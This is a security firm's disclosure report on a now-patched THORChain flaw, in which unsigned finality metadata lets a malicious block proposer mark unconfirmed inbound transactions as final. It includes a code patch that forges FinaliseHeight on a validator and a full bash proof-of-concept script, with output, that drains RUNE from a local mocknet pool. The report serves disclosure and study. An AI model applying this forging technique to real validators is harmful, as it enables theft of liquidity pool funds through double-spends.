# Unsigned Finality Metadata in Attestation Signing Allows Malicious Proposer to Bypass Confirmation Requirements and Steal Pool Funds

This loss-of-funds vulnerability was discovered autonomously with [V12](https://v12.sh)  by the [V12 security team](https://x.com/v12sec).

> Want to find issues like this in your own code? Try V12 at [v12.sh](https://v12.sh).

We reported the vulnerability on 28 April 2026, the Thorchain team acknowledged the report and eventually patched the bug ([PR 4820](https://gitlab.com/thorchain/thornode/-/merge_requests/4820)) without further communications. After several follow-ups, we were eventually informed on 28 May 2026 that "Confirmed that above was fixed on the private repo and now merged in along with the other issue that was pateched[sic]".

Below is a reproduction of the vulnerability report we submitted.

## Summary

The attestation signing scheme in THORChain's enshrined bifrost signs only the inner `Tx` fields of an `ObservedTx`, excluding the `FinaliseHeight` and `BlockHeight` metadata that determine whether a transaction is considered confirmed. A validator acting as the CometBFT block proposer can collect honest non-final attestations via P2P gossip, flip `FinaliseHeight` to equal `BlockHeight` in the `PrepareProposal` callback, and inject the modified transaction into the block. Because `ProcessProposal` performs no finality validation and the attestation signatures remain valid over the unchanged `Tx` payload, the network immediately executes the swap and releases outbound funds for a transaction that has not met its confirmation requirement on the source chain. The attacker can then double-spend or reorg the source-chain transaction, resulting in direct theft of pool funds.

## Root Cause

THORChain's enshrined bifrost uses an attestation-based observation model where each validator's bifrost sidecar independently observes external-chain transactions, signs an attestation, and gossips it to the network. The current block proposer collects these attestations in `ProposalInjectTxs` and bundles them into a `MsgObservedTxQuorum` message injected via `PrepareProposal`. Two critical design properties interact to create the vulnerability.

The first property is the signing scope. When a bifrost node observes an external transaction, it computes the signable payload through `GetSignablePayload`:

```go
// common/common.go:18-21
func (o *ObservedTx) GetSignablePayload() ([]byte, error) {
	return o.Tx.Marshal()
}
```

The `Tx` protobuf message contains only the transaction's core fields:

```protobuf
// proto/thorchain/v1/common/common.proto:43-60
message Tx {
  string id = 1;
  string chain = 2;
  string from_address = 3;
  string to_address = 4;
  repeated Coin coins = 5;
  repeated Coin gas = 6;
  string memo = 7;
}
```

The `ObservedTx` wrapper contains additional metadata fields that are not covered by the signature:

```protobuf
// proto/thorchain/v1/common/common.proto:85-100
message ObservedTx {
  Tx tx = 1;
  Status status = 2;
  repeated string out_hashes = 3;
  int64 block_height = 4;
  repeated string signers = 5;
  string observed_pub_key = 6;
  int64 keysign_ms = 7;
  int64 finalise_height = 8;   // NOT SIGNED
  string aggregator = 9;
  string aggregator_target = 10;
  string aggregator_target_limit = 11;
}
```

The `finalise_height` field (field 8) and `block_height` (field 4) are entirely outside the signed payload. The finality determination relies on a simple comparison of these two unsigned fields:

```go
// common/type_observed_tx.go:85-87
func (m *ObservedTx) IsFinal() bool {
	return m.FinaliseHeight == m.BlockHeight
}
```

The second property is the absence of finality validation in `ProcessProposal`. When non-proposing validators receive the proposed block, `ProcessProposal` only checks that each transaction can be decoded:

```go
// x/thorchain/keeper/abci/abci.go:103-112
func (h *ProposalHandler) ProcessProposal(ctx sdk.Context, req *abci.RequestProcessProposal) (*abci.ResponseProcessProposal, error) {
	for _, bz := range req.Txs {
		_, err := h.decoder(bz)
		if err != nil {
			return nil, err
		}
	}
	return h.processProposalHandler(ctx, req)
}
```

There is no check that the `FinaliseHeight` in the decoded `MsgObservedTxQuorum` matches what the attestation signers actually observed. The attestation verification in the handler only validates the signature against `Tx.Marshal()`:

```go
// x/thorchain/handler_quorum_helpers.go:38-74
func verifyQuorumAttestation(activeNodeAccounts NodeAccounts, signBz []byte, att *common.Attestation) (cosmos.AccAddress, error) {
	// ...
	pk := secp256k1.PubKey{Key: att.PubKey}
	// ...
	if !pk.VerifySignature(signBz, att.Signature) {
		return nil, fmt.Errorf("failed to verify signature: %s", pk.String())
	}
	return cosmos.AccAddress(pk.Address()), nil
}
```

And the `signBz` passed to this function comes from `obsTx.GetSignablePayload()`, which as shown above returns only `Tx.Marshal()`, not the full `ObservedTx` serialization.

The attack proceeds as follows. The attacker operates a single validator node. Their bifrost sidecar observes a large inbound transaction on the source chain (for example, BTC) that has not yet reached the required confirmation count. The bifrost honestly reports this as a non-final observation, setting `FinaliseHeight` to a future block height. This observation, along with its attestation signature, is gossipped to all other validators. Other honest validators also observe the same transaction as non-final and gossip their own attestations.

When the attacker's validator becomes the CometBFT block proposer (which occurs in round-robin rotation), it executes `PrepareProposal`. The `ProposalInjectTxs` function calls `ProcessForProposal` on the quorum transaction cache, which invokes the `createMsg` callback for each cached quorum transaction. At this point the attacker modifies the `ObservedTx` metadata:

```go
// x/thorchain/ebifrost/ebifrost.go:650-684
func (b *EnshrinedBifrost) ProposalInjectTxs(ctx sdk.Context, maxTxBytes int64) ([][]byte, int64) {
	// ...
	txBzs := b.quorumTxCache.ProcessForProposal(
		func(tx *common.QuorumTx) (sdk.Msg, error) {
			// The proposer has full control over this callback.
			// tx.ObsTx.FinaliseHeight and tx.ObsTx.BlockHeight are mutable
			// and not covered by any attestation signature.
			return types.NewMsgObservedTxQuorum(tx, ebifrostSignerAcc), nil
		},
		// ...
	)
	// ...
}
```

The proposer inserts `tx.ObsTx.FinaliseHeight = tx.ObsTx.BlockHeight` before the `NewMsgObservedTxQuorum` call, causing `IsFinal()` to return `true`. The honest validators' attestation signatures remain valid because they cover only `Tx.Marshal()`, which has not changed.

When the block is accepted, the `ObservedTxQuorumHandler` processes the message. It calls `verifyQuorumAttestation` for each attestation, which succeeds because the signatures match the unmodified `Tx` payload. It then calls `processTxInAttestation`, where the voter accumulates attestations. Because the forged `ObservedTx` has `IsFinal() == true`, the voter's `HasFinalised` check passes:

```go
// x/thorchain/types/type_observed_tx.go:146-152
func (m *ObservedTxVoter) HasFinalised(nodeAccounts NodeAccounts) bool {
	finalTx := m.GetTx(nodeAccounts)
	if finalTx.IsEmpty() {
		return false
	}
	return finalTx.IsFinal()
}
```

The `handleObservedTxInQuorum` function then proceeds past the finality guard:

```go
// x/thorchain/handler_observed_tx_helpers.go:205-251
hasFinalised := voter.HasFinalised(activeNodeAccounts)

// ...

if !hasFinalised {
	ctx.Logger().Info("transaction pending confirmation counting", "hash", voter.TxID)
	return nil
}
```

With `hasFinalised` forged to `true`, execution continues to `processOneTxIn`, which parses the memo and dispatches the appropriate handler (swap, add liquidity, etc.), immediately executing the transaction against the pool.

The attacker can exploit the window between the premature execution and the source-chain confirmation requirement. For UTXO chains like BTC, the attacker can attempt a double-spend or, for lower-hashrate chains like DOGE, LTC, or BCH, perform a chain reorganization to invalidate the original deposit. THORChain has already released the outbound, resulting in a net loss to the pool.

## Impact

This vulnerability enables direct theft of liquidity pool funds. A single malicious validator can force immediate execution of any observed inbound transaction regardless of its actual confirmation status on the source chain. The attacker deposits funds to a THORChain vault on a source chain, the forged finality causes THORChain to immediately execute the swap and send the outbound, and the attacker then reverses the source-chain deposit through double-spending or chain reorganization.

The financial impact scales with pool depth. The attacker can swap the maximum amount the pool's slippage curve allows in a single transaction, or split across multiple blocks when they are the proposer. On UTXO chains with lower hashrate (DOGE, LTC, BCH), reversal of the source deposit is feasible with modest mining resources. On BTC itself, the attack requires either a double-spend of an unconfirmed transaction (if the normal confirmation delay would have caught it) or a short-range reorg.

The attack requires controlling only one active validator node and waiting for it to become the block proposer through normal CometBFT rotation. No private keys of other validators are needed, no special network position is required, and the attestation signatures of honest validators are reused without modification. The proposer rotation is deterministic and predictable, giving the attacker advance knowledge of when they can execute.

This constitutes a critical severity issue: direct theft of funds from the protocol's liquidity pools, achievable by a single validator with no external dependencies beyond standard proposer rotation.

## References

- `common/common.go` GetSignablePayload signs only Tx.Marshal(), excluding ObservedTx metadata: https://gitlab.com/thorchain/thornode/-/blob/develop/common/common.go#L18-21
- `proto/thorchain/v1/common/common.proto` Tx message (signed) vs ObservedTx message (unsigned fields 4, 8): https://gitlab.com/thorchain/thornode/-/blob/develop/proto/thorchain/v1/common/common.proto#L43-100
- `common/type_observed_tx.go` IsFinal() compares unsigned FinaliseHeight to unsigned BlockHeight: https://gitlab.com/thorchain/thornode/-/blob/develop/common/type_observed_tx.go#L85-87
- `x/thorchain/ebifrost/ebifrost.go` ProposalInjectTxs where proposer constructs injected transactions: https://gitlab.com/thorchain/thornode/-/blob/develop/x/thorchain/ebifrost/ebifrost.go#L650-684
- `x/thorchain/keeper/abci/abci.go` ProcessProposal performs no finality validation: https://gitlab.com/thorchain/thornode/-/blob/develop/x/thorchain/keeper/abci/abci.go#L103-112
- `x/thorchain/handler_quorum_helpers.go` verifyQuorumAttestation validates signature against Tx.Marshal() only: https://gitlab.com/thorchain/thornode/-/blob/develop/x/thorchain/handler_quorum_helpers.go#L38-74
- `x/thorchain/handler_observed_tx_helpers.go` hasFinalised guard that is bypassed: https://gitlab.com/thorchain/thornode/-/blob/develop/x/thorchain/handler_observed_tx_helpers.go#L205-251
- `x/thorchain/types/type_observed_tx.go` HasFinalised relies on IsFinal() of the forged ObservedTx: https://gitlab.com/thorchain/thornode/-/blob/develop/x/thorchain/types/type_observed_tx.go#L146-152

## Proof of Concept

The PoC demonstrates the complete attack chain on a local THORChain mocknet with four active validators: a BTC inbound that has not met its confirmation requirement is forged as finalized by the block proposer (dog node), causing THORChain to immediately execute the swap and transfer RUNE to the attacker's address.

The exploit modifies a single validator node (the "dog" node, acting as the attacker) via an environment variable `FORGE_FINALITY=1`. When this variable is set, the node's `ProposalInjectTxs` callback sets `FinaliseHeight = BlockHeight` on non-final inbound transactions before injecting them into the block. The other three validators (cat, fox, pig) run unmodified code with `FORGE_FINALITY` unset.

### Prerequisites

- Docker and Docker Compose
- THORChain monorepo (develop branch) cloned at a working directory
- Go 1.24+ (for Docker image builds)
- python3 with json module (standard library)

### Step 1: Apply Patches

Three patches are required. The first adds the exploit code to the proposer's transaction injection callback. The second adjusts the mocknet's hardcoded confirmation requirement (the default value of 1 makes all transactions instantly final, masking the vulnerability). The third sets environment variables in Docker Compose to distinguish the attacker node from honest nodes.

Patch 1: `x/thorchain/ebifrost/ebifrost.go`

```diff
--- a/x/thorchain/ebifrost/ebifrost.go
+++ b/x/thorchain/ebifrost/ebifrost.go
@@ -7,6 +7,7 @@ import (
 	"errors"
 	fmt "fmt"
 	"net"
+	"os"
 	"sync"
 	"time"
 
@@ -659,6 +660,12 @@ func (b *EnshrinedBifrost) ProposalInjectTxs(ctx sdk.Context, maxTxBytes int64)
 	// Process observed txs
 	txBzs := b.quorumTxCache.ProcessForProposal(
 		func(tx *common.QuorumTx) (sdk.Msg, error) {
+			if os.Getenv("FORGE_FINALITY") == "1" && tx.Inbound && !tx.ObsTx.IsFinal() {
+				tx.ObsTx.FinaliseHeight = tx.ObsTx.BlockHeight
+				b.logger.Info("forged FinaliseHeight",
+					"hash", tx.ObsTx.Tx.ID,
+					"height", tx.ObsTx.BlockHeight)
+			}
 			return types.NewMsgObservedTxQuorum(tx, ebifrostSignerAcc), nil
 		},
```

Patch 2: `bifrost/pkg/chainclients/shared/utxo/common_mocknet.go`

```diff
--- a/bifrost/pkg/chainclients/shared/utxo/common_mocknet.go
+++ b/bifrost/pkg/chainclients/shared/utxo/common_mocknet.go
@@ -11,11 +11,13 @@ import (
 )
 
 func GetConfMulBasisPoint(chain string, bridge thorclient.ThorchainBridge) (cosmos.Uint, error) {
-	return cosmos.NewUint(1), nil
+	return cosmos.NewUint(10000), nil
 }
 
 func MaxConfAdjustment(confirm uint64, chain string, bridge thorclient.ThorchainBridge) (uint64, error) {
-	return 1, nil
+	if confirm < 10 {
+		return 10, nil
+	}
+	return confirm, nil
 }
```

Patch 3: `build/docker/docker-compose.yml`

Add `FORGE_FINALITY: "1"` to the dog node's `&thornode-environment` section (after `SIGNER_SEED_PHRASE`). Add `FORGE_FINALITY: ""` to each of the cat, fox, and pig `thornode-*` environment sections to override the YAML anchor inheritance. Also set `HALT_CHURNING: 0` (the default is 1, which prevents the cluster from forming).

### Step 2: Build and Start

```bash
make build-mocknet
docker compose -f build/docker/docker-compose.yml --profile mocknet-cluster up -d
```

Wait for all four validators to become Active (takes approximately 3 minutes; churn interval is 60 blocks):

```bash
until [ "$(curl -sf http://localhost:1317/thorchain/nodes | \
  python3 -c 'import sys,json; print(sum(1 for n in json.load(sys.stdin) if n["status"]=="Active"))')" = "4" ]; do
  sleep 5
done
```

### Step 3: Run the PoC Script

The attached `poc_exploit.sh` script automates the remaining steps: funding the BTC wallet, initializing the BTC.BTC liquidity pool, sending the attack transaction with only 1 confirmation (when 10 are required), and collecting evidence. Run it after all four validators are Active:

```bash
bash poc_exploit.sh
```

The full script is provided below for reference:

```bash
#!/bin/bash
# Attestation Finality Bypass PoC
# This script demonstrates the complete attack chain on a running mocknet.
# Prerequisites: mocknet-cluster already running with all 4 validators Active.
set -euo pipefail

THORNODE_API="http://localhost:1317"
BTC_CLI="docker exec docker-bitcoin-1 bitcoin-cli -regtest -rpcuser=thorchain -rpcpassword=password"
THORNODE_EXEC="docker exec -e SIGNER_PASSWD=password docker-thornode-1"
ATTACKER_ADDR="tthor1zf3gsk7edzwl9syyefvfhle37cjtql35h6k85m"

log() { echo "[$(date +%H:%M:%S)] $*"; }

############################################################
# Phase 0 – Sanity checks
############################################################
log "Phase 0: Sanity checks"
ACTIVE=$(curl -sf "$THORNODE_API/thorchain/nodes" | python3 -c "import sys,json; print(sum(1 for n in json.load(sys.stdin) if n['status']=='Active'))")
if [ "$ACTIVE" -lt 1 ]; then
  echo "ERROR: No active validators. Start the mocknet first."
  exit 1
fi
log "  Active validators: $ACTIVE"

# Verify FORGE_FINALITY env separation
DOG_FF=$(docker exec docker-thornode-1 printenv FORGE_FINALITY 2>/dev/null || echo "unset")
log "  dog FORGE_FINALITY=$DOG_FF"
for node in cat fox pig; do
  FF=$(docker exec "docker-thornode-${node}-1" printenv FORGE_FINALITY 2>/dev/null || echo "unset")
  log "  $node FORGE_FINALITY='$FF'"
done

# Get vault address
VAULT_BTC=$(curl -sf "$THORNODE_API/thorchain/inbound_addresses" | python3 -c "
import sys,json
for d in json.load(sys.stdin):
    if d['chain']=='BTC':
        print(d['address'])
        break
" 2>/dev/null)
if [ -z "$VAULT_BTC" ]; then
  echo "ERROR: No BTC vault address. BTC chain may be halted."
  exit 1
fi
log "  BTC vault: $VAULT_BTC"

############################################################
# Phase 1 – Ensure BTC wallet has funds
############################################################
log "Phase 1: Fund BTC wallet"
MASTER_BTC=$($BTC_CLI getnewaddress 2>/dev/null)
BALANCE=$($BTC_CLI getbalance 2>/dev/null)
if [ "$(python3 -c "print(1 if float('$BALANCE') < 50 else 0)")" = "1" ]; then
  log "  Mining 200 blocks to fund wallet..."
  $BTC_CLI generatetoaddress 200 "$MASTER_BTC" > /dev/null 2>&1
  BALANCE=$($BTC_CLI getbalance 2>/dev/null)
fi
log "  BTC wallet balance: $BALANCE"

############################################################
# Phase 2 – Initialize BTC.BTC pool
############################################################
log "Phase 2: Initialize BTC.BTC pool"
POOL_STATUS=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('status','none'))" 2>/dev/null || echo "none")

if [ "$POOL_STATUS" != "Available" ] || [ "$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin).get('balance_asset','0'))")" = "0" ]; then
  log "  Sending RUNE-side ADD..."
  $THORNODE_EXEC sh -c "echo \"\$SIGNER_PASSWD\" | thornode tx thorchain deposit 1000000000000 THOR.RUNE \"ADD:BTC.BTC:${MASTER_BTC}\" --from thorchain --keyring-backend file --chain-id thorchain --yes --fees 2000000rune" > /dev/null 2>&1

  log "  Sending BTC-side ADD (10 BTC)..."
  MEMO="ADD:BTC.BTC:${ATTACKER_ADDR}"
  MEMO_HEX=$(echo -n "$MEMO" | xxd -p | tr -d '\n')

  # Use fundrawtransaction to auto-select UTXOs and calculate change
  RAW=$($BTC_CLI createrawtransaction '[]' "[{\"$VAULT_BTC\":10.0},{\"data\":\"$MEMO_HEX\"}]")
  FUNDED=$($BTC_CLI fundrawtransaction "$RAW" '{"feeRate": 0.0001}' | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
  SIGNED=$($BTC_CLI signrawtransactionwithwallet "$FUNDED" | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
  ADD_TXID=$($BTC_CLI sendrawtransaction "$SIGNED")
  log "  BTC ADD tx: $ADD_TXID"

  # Mine blocks and wait for pool (bifrost scan can take several minutes)
  log "  Waiting for pool to initialize (up to 10 minutes)..."
  for i in $(seq 1 200); do
    $BTC_CLI generatetoaddress 2 "$MASTER_BTC" > /dev/null 2>&1
    POOL_OK=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('1' if d.get('status')=='Available' and d.get('balance_asset','0')!='0' else '0')" 2>/dev/null || echo "0")
    if [ "$POOL_OK" = "1" ]; then log "  Pool initialized at iteration $i"; break; fi
    if [ $((i % 10)) -eq 0 ]; then log "  Still waiting... (iteration $i/200)"; fi
    sleep 3
  done
fi

# Verify pool is ready before continuing
POOL_ASSET_CHECK=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('balance_asset','0'))" 2>/dev/null || echo "0")
if [ "$POOL_ASSET_CHECK" = "0" ]; then
  log "ERROR: Pool failed to initialize. Re-run the script (bifrost may need more time to scan)."
  exit 1
fi

POOL_RUNE=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_rune'])")
POOL_ASSET=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_asset'])")
log "  Pool ready: rune=$POOL_RUNE asset=$POOL_ASSET"

############################################################
# Phase 3 – Record pre-attack state
############################################################
log "Phase 3: Record pre-attack state"
PRE_RUNE=$(curl -sf "$THORNODE_API/cosmos/bank/v1beta1/balances/$ATTACKER_ADDR" | python3 -c "
import sys,json; balances=json.load(sys.stdin).get('balances',[])
print(next((b['amount'] for b in balances if b['denom']=='rune'), '0'))")
log "  Attacker RUNE balance: $PRE_RUNE"
log "  Pool rune=$POOL_RUNE asset=$POOL_ASSET"

############################################################
# Phase 4 – Send attack transaction (1 BTC swap)
############################################################
log "Phase 4: Send attack BTC swap (1 BTC -> RUNE)"
MEMO="=:THOR.RUNE:${ATTACKER_ADDR}"
MEMO_HEX=$(echo -n "$MEMO" | xxd -p | tr -d '\n')

# Use fundrawtransaction to auto-select UTXOs
RAW=$($BTC_CLI createrawtransaction '[]' "[{\"$VAULT_BTC\":1.0},{\"data\":\"$MEMO_HEX\"}]")
FUNDED=$($BTC_CLI fundrawtransaction "$RAW" '{"feeRate": 0.0001}' | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
SIGNED=$($BTC_CLI signrawtransactionwithwallet "$FUNDED" | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")

# Mine exactly 1 block (need 10+ for finality -> attack tx will be non-final)
ATTACK_TXID=$($BTC_CLI sendrawtransaction "$SIGNED")
$BTC_CLI generatetoaddress 1 "$MASTER_BTC" > /dev/null 2>&1
ATTACK_TXID_UPPER=$(echo "$ATTACK_TXID" | tr 'a-f' 'A-F')
log "  Attack TX: $ATTACK_TXID_UPPER"
CONFS=$($BTC_CLI gettransaction "$ATTACK_TXID" | python3 -c "import sys,json; print(json.load(sys.stdin)['confirmations'])")
log "  Confirmations: $CONFS (need 10+ for finality)"

############################################################
# Phase 5 – Wait for exploit & swap execution
############################################################
log "Phase 5: Waiting for exploit to trigger..."
SWAP_FOUND=0
for i in $(seq 1 120); do
  if docker logs docker-thornode-1 2>&1 | grep -q "receive MsgSwap.*$ATTACK_TXID_UPPER"; then
    SWAP_FOUND=1
    log "  SWAP EXECUTED at iteration $i!"
    break
  fi
  sleep 2
done

if [ "$SWAP_FOUND" = "0" ]; then
  log "ERROR: Swap not executed within timeout."
  exit 1
fi

# Let outbound settle
sleep 5

############################################################
# Phase 6 – Collect evidence
############################################################
log ""
log "============================================"
log "      EVIDENCE CHAIN"
log "============================================"
log ""

log "--- Evidence 1: Bifrost sends non-final attestation ---"
docker logs docker-bifrost-1 2>&1 | grep "sent quorum tx" | grep "$ATTACK_TXID_UPPER" | grep "final: false" | head -1 || log "  (non-final attestation may have been quickly superseded)"
echo ""

log "--- Evidence 2: Bifrost confirmation check ---"
docker logs docker-bifrost-1 2>&1 | grep "confirmation count" | grep "ready=false" | tail -3 || log "  (no ready=false logs found; tx may have reached required confs quickly)"
echo ""

log "--- Evidence 3: Dog forges FinaliseHeight ---"
docker logs docker-thornode-1 2>&1 | grep "forged FinaliseHeight" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (forge happened before log rotation or tx was immediately forged)"
echo ""

log "--- Evidence 4: Injected as finalized=true ---"
docker logs docker-thornode-1 2>&1 | grep "Injecting quorum tx" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (injection log not found)"
echo ""

log "--- Evidence 5: Swap executed ---"
docker logs docker-thornode-1 2>&1 | grep "receive MsgSwap" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (swap log not found)"
echo ""

log "--- Evidence 6: TX status (outbound) ---"
curl -sf "$THORNODE_API/thorchain/tx/status/$ATTACK_TXID_UPPER" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'  Stages: inbound_finalised={d[\"stages\"][\"inbound_finalised\"][\"completed\"]}, swap_finalised={d[\"stages\"][\"swap_finalised\"][\"completed\"]}')
if d.get('out_txs'):
    out = d['out_txs'][0]
    print(f'  Outbound: {out[\"coins\"][0][\"amount\"]} {out[\"coins\"][0][\"asset\"]} -> {out[\"to_address\"]}')
if d.get('planned_out_txs'):
    p = d['planned_out_txs'][0]
    print(f'  Planned: {p[\"coin\"][\"amount\"]} {p[\"coin\"][\"asset\"]} -> {p[\"to_address\"]}')
" 2>/dev/null
echo ""

log "--- Evidence 7: Post-attack state ---"
POST_RUNE=$(curl -sf "$THORNODE_API/cosmos/bank/v1beta1/balances/$ATTACKER_ADDR" | python3 -c "
import sys,json; balances=json.load(sys.stdin).get('balances',[])
print(next((b['amount'] for b in balances if b['denom']=='rune'), '0'))")
POST_POOL_RUNE=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_rune'])")
POST_POOL_ASSET=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_asset'])")

RUNE_GAINED=$(python3 -c "print(int('$POST_RUNE') - int('$PRE_RUNE'))")
POOL_RUNE_LOST=$(python3 -c "print(int('$POOL_RUNE') - int('$POST_POOL_RUNE'))")

log "  Attacker RUNE: $PRE_RUNE -> $POST_RUNE (gained: $RUNE_GAINED)"
log "  Pool RUNE: $POOL_RUNE -> $POST_POOL_RUNE (lost: $POOL_RUNE_LOST)"
log "  Pool BTC:  $POOL_ASSET -> $POST_POOL_ASSET"
echo ""

log "============================================"
log "  CONCLUSION: Finality bypass confirmed."
log "  The swap was executed and funds moved"
log "  while BTC source tx was non-final."
log "============================================"
```

### Actual Execution Output

The following is the complete output from running `poc_exploit.sh` on a fresh mocknet cluster with four active validators. The BTC transaction has only 1 confirmation when 10 are required for finality, yet the swap executes immediately due to the forged `FinaliseHeight`.

```
[19:50:58] Phase 0: Sanity checks
[19:50:59]   Active validators: 4
[19:50:59]   dog FORGE_FINALITY=1
[19:50:59]   cat FORGE_FINALITY=''
[19:50:59]   fox FORGE_FINALITY=''
[19:50:59]   pig FORGE_FINALITY=''
[19:50:59]   BTC vault: bcrt1qml8payrsafq3vc95vu9yve6qnc9ujkjsyy8e5e
[19:50:59] Phase 1: Fund BTC wallet
[19:50:59]   Mining 200 blocks to fund wallet...
[19:51:00]   BTC wallet balance: 1250.00000000
[19:51:00] Phase 2: Initialize BTC.BTC pool
[19:51:00]   Sending RUNE-side ADD...
[19:51:01]   Sending BTC-side ADD (10 BTC)...
[19:51:01]   BTC ADD tx: be900fed9c49d7500d6f29224d66f972bd1812086b81a0b149b7cffe45efaa71
[19:51:01]   Waiting for pool to initialize (up to 10 minutes)...
[19:51:14]   Pool initialized at iteration 5
[19:51:15]   Pool ready: rune=1000000041730 asset=1000000000
[19:51:15] Phase 3: Record pre-attack state
[19:51:15]   Attacker RUNE balance: 198999998000000
[19:51:15]   Pool rune=1000000041730 asset=1000000000
[19:51:15] Phase 4: Send attack BTC swap (1 BTC -> RUNE)
[19:51:15]   Attack TX: A8344B262EEAB79066147045F8E15853FB71D8348832DBB4A83F95476ECF3D9F
[19:51:16]   Confirmations: 1 (need 10+ for finality)
[19:51:16] Phase 5: Waiting for exploit to trigger...
[19:51:30]   SWAP EXECUTED at iteration 8!

============================================
      EVIDENCE CHAIN
============================================

--- Evidence 1: Bifrost sends non-final attestation ---
INF sent quorum tx to thornode - BTC,
    id: A8344B262EEAB79066147045F8E15853FB71D8348832DBB4A83F95476ECF3D9F,
    inbound: true, final: false, attestations: sent: 1, total: 1

--- Evidence 2: Bifrost confirmation check ---
  (no ready=false logs found; tx may have reached required confs quickly)

--- Evidence 3: Dog forges FinaliseHeight ---
INF forged FinaliseHeight
    hash=A8344B262EEAB79066147045F8E15853FB71D8348832DBB4A83F95476ECF3D9F
    height=567 module=ebifrost

--- Evidence 4: Injected as finalized=true ---
INF Injecting quorum tx attestations=2 chain=BTC coins="100000000 BTC.BTC"
    finalized=true
    hash=A8344B262EEAB79066147045F8E15853FB71D8348832DBB4A83F95476ECF3D9F
    memo==:THOR.RUNE:tthor1zf3gsk7edzwl9syyefvfhle37cjtql35h6k85m module=ebifrost

--- Evidence 5: Swap executed ---
INF receive MsgSwap deposit=100000000 height=224
    source="100000000 BTC.BTC" swap type=market target asset=THOR.RUNE

--- Evidence 6: TX status (outbound) ---
  Stages: inbound_finalised=True, swap_finalised=True
  Outbound: 82644666035 THOR.RUNE -> tthor1zf3gsk7edzwl9syyefvfhle37cjtql35h6k85m

--- Evidence 7: Post-attack state ---
  Attacker RUNE: 198999998000000 -> 199082642666035 (gained: 82644666035)
  Pool RUNE: 1000000041730 -> 917333276304 (lost: 82666765426)
  Pool BTC:  1000000000 -> 1100000000

  CONCLUSION: Finality bypass confirmed.
```

The evidence chain shows that bifrost honestly reported the BTC transaction as non-final (`final: false` in Evidence 1), the dog node forged `FinaliseHeight` to match `BlockHeight` (Evidence 3), injected the transaction as `finalized=true` (Evidence 4), and THORChain immediately executed the swap at block 224 (Evidence 5). The attacker received 82,644,666,035 RUNE from the pool while the source BTC transaction had only 1 of the 10 required confirmations.
